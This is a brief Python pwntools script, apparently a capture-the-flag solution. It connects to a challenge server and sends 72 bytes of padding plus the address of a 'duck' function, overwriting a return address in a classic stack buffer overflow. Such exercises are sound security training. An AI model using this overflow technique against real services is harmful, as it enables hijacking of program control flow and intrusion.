#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./chall')

io = remote('chall.v1t.site', 30210)
io.sendlineafter(b"coming!\n", b"A"*72 + p64(exe.sym.duck))
io.interactive()

